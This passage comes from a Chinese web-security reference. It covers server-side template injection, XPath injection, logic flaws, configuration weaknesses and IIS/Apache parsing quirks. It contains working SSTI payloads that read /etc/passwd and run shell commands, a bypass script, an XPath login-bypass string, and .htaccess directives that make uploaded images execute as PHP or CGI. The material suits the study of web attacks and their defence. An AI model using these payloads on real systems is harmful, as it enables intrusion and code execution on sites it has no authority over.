4.11. 模版注入 123
Web-Sec Documentation, 发布 1.0
4.11.6 常见 Payload
• ().__class__.__bases__[0].__subclasses__()[40](r'/etc/passwd').read()
• ().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.
values()[13]['eval']('__import__("os").popen("ls /").read()' )
4.11.7 绕过技巧
字符串拼接
request['__cl'+'ass__'].__base__.__base__.__base__['__subcla'+'sses__']()[60]
使用参数绕过
params = {
'clas': '__class__',
'mr': '__mro__',
'subc': '__subclasses__'
}
data = {
"data": "{{''[request.args.clas][request.args.mr][1][request.args.subc]()}}"
}
r = requests.post(url, params=params, data=data)
print(r.text)
4.11.8 参考链接
• 服务端模版注入
• 用 Python 特性任意代码执行
4.12 Xpath 注入
4.12.1 Xpath 定义
XPath 注入攻击是指利用 XPath 解析器的松散输入和容错特性，能够在 URL、表单或其它信息上附带恶意
的 XPath 查询代码，以获得权限信息的访问权并更改这些信息。XPath 注入攻击是针对 Web 服务应用新的
攻击方法，它允许攻击者在事先不知道 XPath 查询相关知识的情况下，通过 XPath 查询得到一个 XML 文
档的完整内容。
124 Chapter 4. 常见漏洞攻防
Web-Sec Documentation, 发布 1.0
4.12.2 Xpath 注入攻击原理
XPath 注入攻击主要是通过构建特殊的输入，这些输入往往是 XPath 语法中的一些组合，这些
输入将作为参数传入 Web 应用程序，通过执行 XPath 查询而执行入侵者想要的操作，下面以登
录验证中的模块为例，说明 XPath 注入攻击的实现原理。
在 Web 应用程序的登录验证程序中，一般有用户名（username）和密码（password）两个参数，程序会通过
用户所提交输入的用户名和密码来执行授权操作。若验证数据存放在 XML 文件中，其原理是通过查找 user
表中的用户名（username）和密码（password）的结果来进行授权访问，
例存在 user.xml 文件如下：
Ben
Elmore
abc
test123
Shlomy
Gantz
xyz
123test
则 在 XPath 中 其 典 型 的 查 询 语 句 为：//users/user[loginID/text()='xyz'and password/
text()='123test']
但是，可以采用如下的方法实施注入攻击，绕过身份验证。如果用户传入一个 login 和 password，例如
loginID = 'xyz' 和 password = '123test'，则该查询语句将返回true。但如果用户传入类似' or 1=1
or ''='的值，那么该查询语句也会得到true返回值，因为XPath查询语句最终会变成如下代码：//users/
user[loginID/text()=''or 1=1 or ''='' and password/text()='' or 1=1 or ''='']
这个字符串会在逻辑上使查询一直返回 true 并将一直允许攻击者访问系统。攻击者可以利用 XPath 在应用
程序中动态地操作 XML 文档。攻击完成登录可以再通过 XPath 盲入技术获取最高权限帐号和其它重要文
档信息。
4.13 逻辑漏洞 / 业务漏洞
4.13.1 简介
逻辑漏洞是指由于程序逻辑不严导致一些逻辑分支处理错误造成的漏洞。
4.13. 逻辑漏洞 / 业务漏洞 125
Web-Sec Documentation, 发布 1.0
在实际开发中，因为开发者水平不一没有安全意识，而且业务发展迅速内部测试没有及时到位，所以常常会
出现类似的漏洞。
4.13.2 安装逻辑
• 查看能否绕过判定重新安装
• 查看能否利用安装文件获取信息
• 看能否利用更新功能获取信息
4.13.3 交易
购买
• 修改支付的价格
• 修改支付的状态
• 修改购买数量为负数
• 修改金额为负数
• 重放成功的请求
• 并发数据库锁处理不当
业务风控
• 刷优惠券
• 套现
4.13.4 账户
注册
• 覆盖注册
• 尝试重复用户名
• 注册遍历猜解已有账号
密码
• 密码未使用哈希算法保存
126 Chapter 4. 常见漏洞攻防
Web-Sec Documentation, 发布 1.0
邮箱用户名
• 前后空格
• 大小写变换
Cookie
• 包含敏感信息
• 未验证合法性可伪造
手机号用户名
• 前后空格
• +86
登录
• 撞库
• 账号劫持
• 恶意尝试帐号密码锁死账户
找回密码
• 重置任意用户密码
• 密码重置后新密码在返回包中
• Token 验证逻辑在前端
• X-Forwarded-Host 处理不正确
修改密码
• 越权修改密码
• 修改密码没有旧密码验证
申诉
• 身份伪造
• 逻辑绕过
4.13. 逻辑漏洞 / 业务漏洞 127
Web-Sec Documentation, 发布 1.0
更新
• ORM 更新操作不当可更新任意字段
• 权限限制不当可以越权修改
信息查询
• 权限限制不当可以越权查询
• 用户信息 ID 可以猜测导致遍历
4.13.5 2FA
• 重置密码后自动登录没有 2FA
• OAuth 登录没有启用 2FA
• 2FA 可爆破
• 2FA 有条件竞争
• 修改返回值绕过
• 激活链接没有启用 2FA
• 可通过 CSRF 禁用 2FA
4.13.6 验证码
• 验证码可重用
• 验证码可预测
• 验证码强度不够
• 验证码无时间限制或者失效时间长
• 验证码无猜测次数限制
• 验证码传递特殊的参数或不传递参数绕过
• 验证码可从返回包中直接获取
• 验证码不刷新或无效
• 验证码数量有限
• 验证码在数据包中返回
• 修改 Cookie 绕过
• 修改返回包绕过
128 Chapter 4. 常见漏洞攻防
Web-Sec Documentation, 发布 1.0
• 验证码在客户端生成或校验
• 验证码可 OCR 或使用机器学习识别
• 验证码用于手机短信/邮箱轰炸
4.13.7 Session
• Session 机制
• Session 猜测 / 爆破
• Session 伪造
• Session 泄漏
• Session Fixation
4.13.8 越权
• 未授权访问
• 水平越权
– 攻击者可以访问与他拥有相同权限的用户的资源
– 权限类型不变，ID 改变
• 垂直越权
– 低级别攻击者可以访问高级别用户的资源
– 权限 ID 不变，类型改变
• 交叉越权
– 权限 ID 改变，类型改变
4.13.9 随机数安全
• 使用不安全的随机数发生器
• 使用时间等易猜解的因素作为随机数种子
4.13.10 其他
• 用户/订单/优惠券等 ID 生成有规律，可枚举
• 接口无权限、次数限制
• 加密算法实现误用
4.13. 逻辑漏洞 / 业务漏洞 129
Web-Sec Documentation, 发布 1.0
• 执行顺序
• 敏感信息泄露
4.13.11 参考链接
• 水平越权漏洞及其解决方案
• 细说验证码安全测试思路大梳理
4.14 配置安全
• 弱密码
– 位数过低
– 字符集小
– 为常用密码
– 个人信息相关
* 手机号
* 生日
* 姓名
* 用户名
– 使用键盘模式做密码
• 敏感文件泄漏
– .git
– .svn
• 数据库
– Mongo/Redis 等数据库无密码且没有限制访问
• 加密体系
– 在客户端存储私钥
• 三方库/软件
– 公开漏洞后没有及时更新
130 Chapter 4. 常见漏洞攻防
Web-Sec Documentation, 发布 1.0
4.15 中间件
4.15.1 IIS
IIS 6.0
• 后缀解析 /xx.asp;.jpg
– 服务器默认不解析 ; 号及其后面的内容，相当于截断。
• 目录解析 /xx.asp/xx.jpg (xx.asp 目录下任意解析)
• 默认解析 xx.asa xx.cer xx.cdx
• PROPFIND 栈溢出漏洞
• RCE CVE-2017-7269
IIS 7.0-7.5 / Nginx <= 0.8.37
在 Fast-CGI 开启状态下，在文件路径后加上 /xx.php ，即 xx.jpg/xx.php 会被解析为 php 文件。
PUT 漏洞
• 开启 WebDAV
• 拥有来宾用户，且来宾用户拥有上传权限
• 可任意文件上传
Windows 特性
Windows 不允许空格和点以及一些特殊字符作为结尾，创建这样的文件会自动重命名，所以可以使用 xx.
php[空格] ，xx.php.，xx.php/，xx.php::$DATA 上传脚本文件。
文件名猜解
在支持 NTFS 8.3 文件格式时，可利用短文件名猜解目录文件。其中短文件名特征如下：
• 文件名为原文件名前 6 位字符加上 ~1 ，其中数字部分是递增的，如果存在前缀相同的文件，则后面的
数字进行递增。
• 后缀名不超过 3 位，超过部分会被截断
• 所有小写字母均转换成大写的字母
• 文件名后缀长度大于等于 4 或者总长度大于等于 9 时才会生成短文件名，如果包含空格或者其他部分
特殊字符，则无视长度条件
4.15. 中间件 131
Web-Sec Documentation, 发布 1.0
IIS8.0之前的版本支持短文件名猜测的HTTP方法主要包括：DEBUG、OPTIONS、GET、POST、HEAD、
TRACE 六种，需要安装 ASP.NET。而 IIS 8.0 之后的版本只能通过 OPTIONS 和 TRACE 方法猜测成功，
但是没有 ASP.NET 的限制。
这种方法的局限性在于：
• 文件夹名前 6 位字符带点”.”，扫描程序会认为是文件而不是文件夹，最终出现误报
• 不支持中文文件名
这种方法可以通过命令 fsutil behavior set disable8dot3 1 关闭 NTFS 8.3 文件格式的支持来修复。
参考链接
• 利用 Windows 特性高效猜测目录
• Uploading web.config for Fun and Profit 2
4.15.2 Apache
后缀解析
test.php.x1.x2.x3 （x1,x2,x3 为没有在 mime.types 文件中定义的文件类型）。Apache 将从右往左开始判
断后缀，若 x3 为非可识别后缀，则判断 x2，直到找到可识别后缀为止，然后对可识别后缀进行解析
.htaccess
当 AllowOverride 被启用时，上传启用解析规则的.htaccess
AddType application/x-httpd-php .jpg
php_value auto_append_file .htaccess
#<?php phpinfo();
Options ExecCGI
AddHandler cgi-script .jpg
Options +ExecCGI
AddHandler fcgid-script .gif
FcgidWrapper "/bin/bash" .gif
php_flag allow_url_include 1
php_value auto_append_file data://text/plain;base64,PD9waHAgcGhwaW5mbygpOw==
(下页继续)